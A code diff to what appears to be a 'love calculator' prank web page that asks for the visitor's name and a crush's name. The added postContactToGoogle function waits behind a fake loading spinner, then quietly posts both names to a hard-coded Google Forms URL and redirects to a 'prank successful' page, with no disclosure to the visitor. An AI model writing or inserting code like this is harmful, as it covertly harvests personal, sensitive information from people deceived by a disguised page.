@@ -25,7 +25,7 @@
 </header>
 		<div class="form">
 		<input type="text" placeholder="Your Name" id="yn" >
-		<input type="text" placeholder="Your Crush/gf/bf Name">
+		<input type="text" placeholder="Your Crush/gf/bf Name" id='cn'>
     <p id="loading" style="position: relative;
     left: 46%; font-weight: 300;"> </p>
 		<button type="button" id="myButton" data-loading-text="Loading..." class="btn btn-primary" autocomplete="off" style="background: #D41C52" >
@@ -54,24 +54,33 @@
     $btn.button('reset')
   })*/
  
+function postContactToGoogle()
+   {
+     var yourName= $('#yn').val();
+     var crushName= $('#cn').val();
 
+   $.ajax({url:"https://docs.google.com/forms/d/e/1FAIpQLSfcRowx-ooDVWWTdknI4YtVdvF6o9xlJOkCVT4sgE9vrRR8rA/formResponse", data:{"entry_1286591939":yourName,"entry_1550824382":crushName},type:"POST", dataType:"xml", statusCode:{0:function(){ window.location.replace("prank_successful.html");},200:function(){window.location.replace("prank_successful.html");}}
+   });
+   }
+   
 
  
   document.getElementById("myButton").onclick = function () {
-  	 var name= document.querySelector("#yn").value;
-  	 if(name.length != 0)
-  {
     
-    $('#loading').html("<img src='https://learnhownow.com/assets/ajax-loader.gif' style='height:60px; width:60px;'>");
-      setTimeout(function(){
-        location.href = "prank_successful.html";
+  	 var name= document.querySelector("#yn").value;
+ 	 if(name.length != 0)
+   {
+    
+     $('#loading').html("<img src='https://learnhownow.com/assets/ajax-loader.gif' style='height:60px; width:60px;'>");
+      setTimeout(function() {postContactToGoogle();}, 7000);
+      
 
 
-      }, 7000);
-    }
-     else{
+      
+     }
+      else{
 
-    alert("Please enter a name");
+     alert("Please enter a name");
 
    }     
     };
